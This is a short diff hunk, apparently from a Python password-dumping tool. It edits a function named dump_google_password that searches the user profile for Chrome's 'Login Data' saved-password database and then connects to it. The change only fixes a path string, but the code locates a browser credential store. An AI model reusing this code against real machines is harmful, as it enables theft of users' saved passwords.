@@ -68,7 +68,7 @@ def dump_google_password():
     except IndexError:
         for w in os.walk(os.getenv('USERPROFILE')):
             if 'Chrome' in w[1]:
-                path = str(w[0]) + '\Chrome\User Data\Default\Login Data'
+                path = str(w[0]) + r'\Chrome\User Data\Default\Login Data'
 
     # Connect to the Database
     try:
